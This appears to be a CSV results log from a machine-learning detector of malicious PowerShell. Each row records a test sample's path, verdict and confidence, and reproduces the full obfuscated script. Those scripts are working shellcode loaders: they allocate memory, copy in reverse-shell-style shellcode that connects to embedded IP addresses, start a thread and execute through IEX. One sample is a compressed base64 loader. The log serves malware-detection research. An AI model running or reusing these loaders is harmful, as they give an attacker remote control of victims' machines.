0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89',',0x01,0xd0,0x89,','89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5','dd-Type -memberDefinition JuSc -Name 9ISWin329I','0xd5,0x01,','Si], 1)};J','5,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0','ateThread(0',',0xc0,0x74,0x0c,0xff,0x4e,0x08,0x7','x40);for (JuSi=0;JuSi -le (JuSz.Length-1);JuSi++) {JuSw::memset([IntPtr](JuS','nt dwStackSize, IntP')).replaCE('9IS',[STring][cHAr]34).replaCE('JuS','$').replaCE('YVe',[STring][cHAr]39) | &amp; ( $env:coMSPEC[4,15,25]-joIN'')",malicious,TP
2026-07-13 17:02:32,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2643.ps1,custom-ps-ml,UNKNOWN,f5092b70-9c61-43f7-a6b8-b130e3b55963,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2727,1758.7," (((\""{8}{31}{40}{16}{43}{32}{13}{45}{0}{14}{23}{41}{33}{20}{12}{11}{18}{26}{4}{9}{34}{44}{42}{15}{29}{19}{39}{36}{25}{1}{17}{5}{30}{10}{22}{35}{3}{24}{37}{27}{21}{28}{6}{7}{38}{2}\"" -f 'rt.dllKQu)]public static extern IntPtr memset(IntPtr','ea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xef,0x00,0x68,0x02,','ep 60};','8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x','ff,0xac,0','x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0','w::memset([IntPtr](M17x.ToInt32()+M17i), M1','7z[M17i], 1)};M17w::CreateThread(0,0,M17x,0,0,0);for (;;){St','M17c = ITh[DllImport(','x3c,',',0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x5','14','8b,0x52,0x','d(IntPtr lpThreadAttributes, uint dwStackSize, IntP',' dest, uint src, uint count);ITh','1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x','(IntPtr lpAddress, uint dwSize, ','0x00,0',',0x8b,0x72,0x28,0x0f,','x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0','8b,0x50,0x30,0x8b,0x52,0x0c,0x',',M17g,0x40);for (M17i=0;M17i -le (M17z.Length-1);M17i++) {','7,0x68',';M17w = Add-Type','58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00','xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0x','0xb7,0x4a,0x26,0x31,0x','3,0x29,0xc6,0x75,0xee,0xc3;M17g = 0x1000;if (M17z.Length -gt 0x1000){M17g = M17z.Length};M17x=M17w::VirtualAlloc(0,0x1000','M17','58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0','c,0xff,0x4e','KQukernel32.dllKQu)]public stat','rnel32.dllKQu)]public static extern IntPtr CreateThrea','e5,0x31,0xc0,0x64,0x','0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0',',0x02,0xd9,0xc','0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0',',0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc','art-sle','x32,0x00,0x00,0x68,0x77,','ic extern IntPtr VirtualAlloc',' -memberDefinition M17c -Name KQuWin32KQu -namespace Win32Functions -passthru;[Byte[]];[Byte[]]M17z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0x',',0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc','uint flAllocationType, uint flProtect);[DllImport(KQuke','x01,0xc7,0xe2,0xf2','tr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(KQumsvc'))-crEPlaCe ([ChAr]73+[ChAr]84+[ChAr]104),[ChAr]39-crEPlaCe'M17',[ChAr]36  -RepLACe  'KQu',[ChAr]34)|&amp; ( ([sTriNG]$vERbOSEPrEFErEnCe)[1,3]+'X'-JOiN'')",malicious,TP
2026-07-13 17:02:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2653.ps1,custom-ps-ml,UNKNOWN,cb1d1dfc-a3b8-48c8-8834-959d34ed5909,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2938,1624.21,"(((\""{63}{5}{51}{3}{11}{35}{64}{34}{24}{38}{52}{61}{27}{43}{25}{39}{23}{6}{58}{1}{17}{20}{9}{22}{26}{49}{54}{40}{33}{56}{50}{19}{57}{2}{53}{59}{13}{69}{45}{31}{46}{16}{37}{41}{32}{47}{55}{29}{66}{18}{67}{60}{7}{28}{14}{68}{12}{10}{62}{21}{36}{30}{48}{44}{4}{0}{42}{65}{15}{8}\"" -f 'Ptr](vY','ion vY7c -Name bNwWin','0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xa','IntPt','ualAlloc(0,0x1000,vY7g,0x40);for (vY7i=0;vY7i -le (vY7z.Length-1);vY7i++) {vY7w::memset([Int','Nwke','Y7w ','6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0',' 60};',';[Byte[]];[Byte[]]vY7z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,',',0x00,0x10,0x00,0x00,0','r lpAddress, uint dwSize, uint flAllocationTyp','2,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68','d,0','x0c,0xff,0x4e,0x','vY7x,0,0,0);for (;;){Start-sleep',',0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0','32bNw -namespace Win32Functions -passt','ff,0xd5,0x97,0x6a,0x05,0x68,0x6d,0xe8,0xe3,0x95,0x68,0x02,0x00,0x85,0x','c7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0','hru',',0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x2','0x0c,0x8b,0x52,0x14,0x8','int src, uint count);P37;v','ntPtr CreateThread(IntPtr lpThreadAt','ntPtr ','b','nt dwCreationFla','x85,0xc0,0x74,0','x50,0x50,0x50,0x50,0x40,0x5','7g = 0x1','d,0x','4,0x50,0x68,0x29,0x80','0x3c,0x6','Nw)]public static extern I','e, uint flProt','9,0xc6,0x85,0xf6,0x75,0xec,0xc3;vY','xff,0xd5,0xb8,0x90,0x01,0x00,0','tributes','dest, u','f,0x31,0xc0,0xac,','x00,0x29,0xc4,0x5','7x.ToInt32()+vY7i), vY7z[vY7i], 1)};vY7','gs, IntPtr lpThreadId);[DllImport(bNwmsvcrt.dllbNw)]public static extern IntPtr memset(I','th -gt 0x1000){vY7g = vY7z.Length};vY7x=vY7w::Virt',',0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5','68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32',',0x6b,0x00','000;if (vY7z.Leng',',0x72,0x','0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0x','rnel32.dllbNw)]public static extern IntPtr VirtualAlloc(',', uint dwStackSize, IntPtr lpStartAddress, IntPtr lpP','c,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0','28,0x0f,0xb7,0x4a,0x26,0x31,0xf',',0xff,0xd5,0','1,',',0x74,0x4a,0x01,0xd0,0x50,0x8b,','= Add-Type -memberDefinit','xf4,0x03,0x7','0x','arameter, ui','x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53','vY7c = P37[DllImport(b','ect);[DllImport(bNwkernel32.dllb','w::CreateThread(0,0,','0,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0x','ba,0x89,0xe6,','08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x0','xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b')) -rEPlACE([cHAR]98+[cHAR]78+[cHAR]119),[cHAR]34  -crepLAce'vY7',[cHAR]36  -rEPlACE'P37',[cHAR]39)| &amp;( ([stRinG]$verboSePREferEnce)[1,3]+'x'-joIn'')",malicious,TP
2026-07-13 17:02:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2661.ps1,custom-ps-ml,UNKNOWN,8befacff-1dad-47b1-8746-9d9f515eb701,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2723,1584.62," invOKE-exPRessioN( (((\""{30}{20}{42}{37}{16}{31}{1}{40}{0}{4}{18}{15}{21}{17}{23}{22}{5}{34}{43}{29}{14}{25}{10}{3}{9}{6}{36}{12}{26}{28}{19}{8}{7}{11}{24}{35}{13}{38}{32}{41}{45}{44}{2}{33}{27}{46}{39}\""-f 'port(QFsmsvc',' lpParameter, uint dwCreationFlags, IntPtr l','= 0x',',0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x2','rt.dllQFs)]public static extern IntPtr memset(I','x3c,0x49,0x8b,0x34,0x8b',',0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1','x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,','0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x17,0x80,0x68,0x02,0','4,0x01,0xd3','0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8','0x','01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0','x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff','c0,0xa','x00,0','IntPtr CreateThread(IntPtr ','9,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0x','ntPtr dest, uint src, uint count);U7H;aqFw = Add-Type -memberDefinition aqFc -Name QFsWin32QFs -namespace Win32Functions -passthru;[Byte[]];[Byte[]]aqFz = 0xfc,0xe8,0x89,0x00,0x00,0','0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,','dllQFs)]public','x60,0x8','8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0','b7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x','57,0x68,0x99,0xa5,0x74,0x61,0xff,','c,0xc1,0xcf,0x0d,0x01,0xc7,','x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b','Fi=0;aqFi -le (aqFz.Length-1);aqFi++) {aqFw::memset([IntPtr](aqFx.ToInt32()+aqFi), aqFz[aqFi], 1)};aqFw::CreateThread(0',',0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,','31,0x','aqFc = U7H[DllImport(QFskernel32.','lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr','0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0','1000;if (aqFz.Length -gt 0x1000){aqFg = aqFz.Length};aqFx=aqFw::VirtualAlloc(0,0x1000,aqFg,0x40);for (aq',',0','0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0','c,0x','uint flProtect);[DllImport(QFskernel32.dllQFs)]public static extern ',',0xd5,0x8b,',' (;;){Start-sleep 60};','pThreadId);[DllIm','x93,',' static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, ','x01,0xd6,0x31,0xff,0x','xc3;aqFg ','0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0',',0,aqFx,0,0,0);for')) -rEPlace 'QFs',[chaR]34-rEPlace  'aqF',[chaR]36  -CREPLAcE  'U7H',[chaR]39) )",malicious,TP
2026-07-13 17:03:02,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2668.ps1,custom-ps-ml,UNKNOWN,b89d7c58-6d43-4f6e-80ae-e62d418799a1,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3060,1609.85,"Invoke-eXPRessiON(((\""{34}{67}{69}{10}{7}{16}{51}{37}{12}{31}{65}{46}{6}{30}{27}{18}{66}{11}{58}{55}{53}{26}{25}{61}{56}{13}{50}{40}{43}{39}{42}{54}{36}{4}{35}{62}{38}{15}{71}{24}{21}{3}{8}{60}{49}{5}{48}{45}{20}{9}{23}{2}{1}{59}{47}{17}{28}{64}{41}{52}{63}{33}{57}{32}{14}{72}{0}{29}{19}{70}{22}{44}{68}\""-f '(zB4x.T','2,0x5f,0xe3,0xd0,0x06,0',',0x8b,0x64,0x5','0x84,0x1e,0xf6,0x64,0xa5,0x','xd7,0x6d,0','0xfd,0x88,0x7a,0x4c,0xd7,0xa0,0x10,0xa3,0x8e,0x99,0x8c,0x5a,0x8b,0x52,0x2d,0xa2,0x01,0x1f,0x6d,0x28,0xa6,0xdf,0x23,0xd9,0xc3,0xf3,0xd3,0x29,0x9e,0xae,0x75,0x35,0x34,0xc4,0x79,0','thru;[Byte[]];[Byte[]]zB4z = 0xbb,0x16,0x94,0x4c,0x80,0xd9,0xe5,0xd','Ml3)]','f4,0x06,0x89,0x70,0x60,0x02,0x1d,0x41,0x1','5e,0x4b','ionType, uint flProtect);[DllImport(Ml3kernel32.dll','3,0xed,0xea,0x76,0xb9,0x7c,0xfa,0xf5,0x42,0x7d,0xfa,0x99,0xcb,0x98,0xcb,0x9','extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreatio','0,0x36,0x86,0x77,0xff,0x77,0x27,0x8a,0x0',' (zB4z.Length-1);zB4i++) {zB4w::m','x7b,0x4f,0x1d,0x71,0x','publ','x93,0x20,0x8b,0x8a,0x1c,0x11,0x',',0xc9,0xb1,0x47,0x','2()+zB4i),','8,0xc4,0x41,0x9d,0x13,0xcd,0xd7,0x',',0x74,0x89,0xd0,0x4e,0x5c,0x4d,','zB4',',0x32,0x38,0x5f','76,0x2f,0x2d','5,0x36,0x3e,0x6','x0c,0xa7,0x26,0x5a,0xa5,0x02,0x11,0x5','5d,0x31','7','oInt3','9,0x74,0x24,0xf4,0x','nFlag','le','Length -gt 0x1000){zB4g = zB4z.Length};zB4x=zB4w::VirtualAlloc(0,0x1000,zB4g,0x40);f','zB4c = fRn','x61,0xd3,0x',',0x03,0x3a,0x7d,0x08,0x20,0x9e,0x26,0xca,0x49,0x87,0x82,0xbd,0x76,0','c static ','bb,0x43,0x01,0x0b,0xd4,0xd4,0x72,0x39,0','0x9c,0xbd,0x71','0x74,0xc9,0xec,0x08,0x8f,0x0e','9f,0xa7,0x6a,0xda,0x60,0x82,0x6a,0x26',',0',',0x8f,0xd6,0x1a,0x95,0x37,','w::CreateThread(0,0,zB4x,0,0,0','x5b,0xbe,0xb6,0x1','finition zB4c -Name Ml3Win32Ml3 -namespace Win32Functions -pass',',0x16,0x1f,0','xa3,0xb3,0x4f,0x2e,0','0xe7,0xb2,0x28,0xf2,0x57,0x5a,0x23,','1,0xbf,0x8f,0x75,','i',',0xb7','b,0x2a,0xba,0xbc,0x77,0xc1,0xee,0x54,0','xc6,0x71,0x5b,0xf1,0xc4,0x3e,0x2f,0x5d,0xc8,0xc1,0xfc,0xd5,0xf4,0x4a','9,0x7','xa8,0xca,0x25,0xf0,0xe2,0xdb,0x2d,0xe5,0xb2,0xda,0x1c,0xb8,0xc9,0x84,0xbe,0x3a,0x1e,0xbd,0xf6,0x24,0x43,0xf8,0x41,0xde,0xb7,0x76,0x5','or (zB4i=0;zB4i -','9,0xa8,0xe','x0c','4,0xc8,0x76,0xdd,0xd4,0xd0,0x92,0x14,0x50,0x36,0xf2,0x78,0x32,','1,0xf4,0xb4,0x3d,0xb6,0xd6,0x85,0x8d,0xcb,0x17,0xc2,0xf0,0x26,0x45,0x9b,0x7f,0x94,0x7a,0','93,0x83,0x76,0x6e,0xfe,0xcb,0x',',0xea,0x18,0x46,0x0b;zB4g = 0x1000;if (zB4z.','8,0x1c,0x75,0x','s, IntPtr lpThreadId);[DllImport(Ml3msvcrt.dllMl3)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);fRn;zB4w = Add-Type -memberDe','31,0x5d,0x13,0x03,0x5d,0x13,0x8','[DllImport(Ml3kernel32.dllMl3)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, u',');for (;;){Start-sleep 60};','int flAllocat',' zB4z[zB4i], 1)};','f4,0x49,0xda,0x','emset([IntPtr]')).RepLAce(([CHar]122+[CHar]66+[CHar]52),[sTrInG][CHar]36).RepLAce('Ml3',[sTrInG][CHar]34).RepLAce(([CHar]102+[CHar]82+[CHar]110),[sTrInG][CHar]39))",malicious,TP
2026-07-13 17:03:15,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2672.ps1,custom-ps-ml,UNKNOWN,03cd1c16-324a-42aa-94ee-692b52a71c68,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2951,1620.93," ((\""{8}{11}{1}{30}{69}{54}{5}{43}{6}{24}{39}{46}{16}{15}{4}{31}{37}{21}{35}{10}{33}{68}{52}{17}{9}{18}{0}{66}{3}{63}{22}{14}{48}{27}{49}{47}{55}{42}{36}{38}{59}{34}{57}{13}{28}{23}{51}{65}{45}{2}{61}{64}{44}{29}{19}{32}{60}{12}{26}{41}{7}{58}{53}{50}{40}{62}{67}{25}{56}{20}\"" -f '8,0x24,0x',' static extern IntPtr VirtualAlloc(IntPtr lpAddress, u','6a,0x00,0x56,0x',',0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61','n32Uj8 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]FZpsc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28','r lpThreadAttr','meter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(','i=0;FZpi -le (FZpsc.Len','FZpc = 59j[DllImport(Uj8','0xc0,','0x40,0x78,0x85,0xc0,0x74,0x4a,','kernel32.dllUj8)]public','x1000,FZpsi','0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd','f,0x5a,0x8b,0x12,0xeb,0x86,0',' -Name Uj8Wi','dd-Type -memberDefinition FZpc',',0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,','0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x5','000){FZpsize = FZpsc.Length}','){Start-sleep 60};','x','0x5',',0x5f,0xff,0','Uj8msvcrt.dllUj8)]public static extern IntPtr',',0);for ','ze,0x40);for','x68,0x','9,0xc8','FZpsc.Length -gt 0x1','int dwSize, uint flAllocationType, uint flProtect);[Dll',',0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x0',';FZpx=FZpw::VirtualAlloc(0,','0x01,0xd0,0x50,0x8b,0x48,','0,0','42,0x3c,0x01,0xd0,0x8b,','00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x5','2,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0','0,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0',' memset(IntPtr dest, uint src, uint count);59j;FZpw =','i',' (FZp','6b,0x','ibutes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPara','xc3;FZpsize = 0x1000;if (','xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x',' A','77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x','x5d,0','33,0x32,0x00,0x00,0x68,0x','.ToInt32()+FZp','xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,',',0xe3,0x3c','FZpx','nel32.dllUj8)]public static extern IntPtr CreateThread(IntPt','50,0x68,0x29,0x80,0x','(;;','x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,','gth-1);FZpi++) {FZpw::memset([IntPtr](','xc0,0xa8,0x4a,0x80,0x68,0x02,0x0','0','53,0x57,0x68,0x02,0x','), FZpsc[FZpi], 1)};FZpw::CreateThread(0,0,FZp',',0x59,0x5a,0x51,0xff,0xe0,0x58,','d9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0','0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0','01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58','x,0,0','0x18,0x8b,0x58,0x20,0x01,0xd3','Import(Uj8ker')).RepLAcE(([CHar]85+[CHar]106+[CHar]56),[StRiNg][CHar]34).RepLAcE(([CHar]53+[CHar]57+[CHar]106),[StRiNg][CHar]39).RepLAcE('FZp',[StRiNg][CHar]36) | IeX",malicious,TP
2026-07-13 17:03:18,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2678.ps1,custom-ps-ml,UNKNOWN,4a37cd31-e7eb-445d-9603-00e79fc5a605,DESKTOP-BAC9DBQ,malicious,0.9619,RandomForest,2938,1704.56,"(((\""{47}{30}{63}{42}{5}{49}{10}{4}{69}{6}{45}{65}{71}{1}{14}{48}{68}{59}{19}{44}{38}{21}{7}{52}{50}{66}{62}{20}{46}{2}{17}{35}{57}{11}{31}{22}{26}{54}{27}{51}{12}{53}{56}{24}{39}{64}{55}{60}{32}{33}{25}{15}{9}{40}{37}{34}{67}{70}{28}{58}{0}{36}{29}{16}{23}{13}{3}{8}{61}{43}{18}{41}\""-f'wG8inc4KaXYs49Uqq/n/0GwtGEZrSEXeiIZ5rHYGC4287Q0ZSTgU5fWhaoPDAFMxcIiR5FgjAKXMTRr1LzqmGBuyZr4QtXAilrXqqytV+k6o/ujex60PHx6EIXnxSYpBqYcDj6+L2r6maaLlavu6phbebn+DbQ/Kd2nFpGufQHl6EU0vUgsZ1Gu+FnUK/Z+xzmtjevW/x','A+nXJiYyMw5FFsuhQAZkCMpqqRs8s','0rPwidhJsLB5EjQhKv41QNSSjXnX31LsC+q0YhgUeqI+5','RF2sRh5L0y2FD0RixEoEZ0KSYjF3p+A','Dg4jwgKpWiicN1mXSx+lT3JhFQcuT7aTxaOH+eM2ZO4jRCjEUST9UTgbwhD6knL+DMNHn6GY4qKUfiSEGMUhVs/OCmfpVhxEcIUfA8jJM370MV8zFImLlDnYbpvMhyRYfPjQiMMQBzz7LrUxB1GE/SUlOFJU6as0X','AAAAAAAAAL1XfW/aS','pTdkS0pzs0','CcGvI7eJVyTAzUMAfeIeg1N5zWl4RXEKSOlI1heKKnJ+','co2/Lg0AAA=={0})','mzleOvK','6xTJtkrAvCRNKlXqGjDgYCAYDAmHosW7mA1rL7XXAXrtd7/1Cy29pHe556THkqX17szszG9ebWN+YfOQuNxiCEsX','KDkk5','eT8bv1ememgVqtPqhpG4TNhH4DUN8nu31P','Ixfp','w1WzoOY0qL0SZnnCo3igBMfi3OOQ7a1','h+0YRd8AaBh1tusNW','6K+kEoYh8EcM9/ixdq8mcGHEY8osnthR/Amm7VM6hKnVbM+kcSt+kCwEKiGpV8TsQe','CmVx','.Compressi','Iw1uZlFMmQTX','sEm3lEF+VVMG','YsIinfR0krSpZQAnIWHsTn+TiMsbqQ5onr5otFfu2RMyr+UlDlyJXzZM7M9PgozR1G0KJwlvo5PU8OHpcxoQiH','jJD5OozwVT1pG','nHSO6Xs7+artBOmp','Q2fExh3X18tl56qbWKX3l7Xtdtner3tfJrHVAOy+esPdtqHBqRk9jCNv7PTNkQ0ue0/gfddA2','8ajru2BPfA9bnRmtCTXvimHdwwJ3e03O5c','YGn/FYeEBOI574bUAuZG1Lp7sRriXdCal3WfI9u','2X','KwCbQ+AFgBOdX2/NYZU2DaeVAbmZQUx0B','JzPjiadFhK3yJxnxBzG/6IuJsiB/KhS','=New-Object IO.MemoryStream(,[Convert]::FromBase64','KIGycUXkfcf1fu5JP2kZyPEuSeVNBXn+oEnCZNSukkn+PgdzBS6kAvY','Y04c4zOoGCPYi3Rh13jSXs/IQ7ldvp','mau3f','9Wxp2yU2WdifNwB3toVgeCd3kNejsABi6q6N3g/qrO9uV3kXOl','hv0MJ','/rH3t+cvgl/rXgK0ovDnzf+jTv+O0RTSLhgtUUPoDibYt6KVB6A','rSWyNJha7KeCV','zIBfQnYVU4O5unSyzsUY','6U/ekY1yxvTO69P6vvBQZ+4Pt','6PtleCfHO+dwobWbncS+hlALW9frs+qCNjmOxyZ8DY06','onMode]::Decompress))).ReadToEnd();','I','eamReader(New-Object IO.Compression.GzipStream({1}s,[IO.Compression','koVrM3fcW3a3UxZk4WX2p/UkcqOJ5EQtq4VvhlahCmGIPcv','IDuWhgEApSc9ZgLEwtK9pYSrsi//y6r84','pBSEnhC','{1}s','cfhMXByVOjBAFI','BP/O3wK','hsURlFRGsY','Ib0bBtXAOy83budR+4K3JtmDNBd0e07jVAjd5dhxi7zugWIF3sefek4nkADZ+GLb/X70Z6JZ','gFEzh0dOEJ2/ZGv5hH/n1TPlgCscHwmtREyoPyuTOVGRu4GFfQFg9i0LZ61ESuAjdZ4Gh+Ptybcgk','rEVtHfR0wad1actsjJbTqvE','zadO','1VEYz8u42N+ZovHk/mlw6E60yvtNu+rd3+v3UWP/PLzA2+3IFzZwKGsHmdorhqlzB/','wpZ1y3Vivpiyyr+oPCLYvKQI6Q1Ua','L/Ru1jomRZkWB1BOlEaREANmW8','DnRn8K9dspwb1MR6va03ed5trVK5fOU/NKr4kLrveDcTe2xq1a76m1t+z63mpu','e6','jixYvql',');IEX (New-Object IO.Str','KIIhIfgRiztKl/ENdK6acuDDiR3EL9RVI86sbLIh4GLvCvQKGsb3FLoE0QaUodQjC+','String({0}H4s','08TC+','vKotT6HEMaKbJ9iDj2S4h','iJ92iZGNIMSp','Bcxblcv','/waqH08','eMQXwyWT9jl0h/S+WO','lw80OauuKsIFd96bEeS47cKMzI','SWZW+qcmF48MWK7JF3JBFbMVLUxLUqqVJqn0/Vd7KdJfVgrAtxDwO')) -f  [CHAR]34,[CHAR]36)| &amp;((VariAbLe '*mdr*').NamE[3,11,2]-JOIn'')",malicious,TP
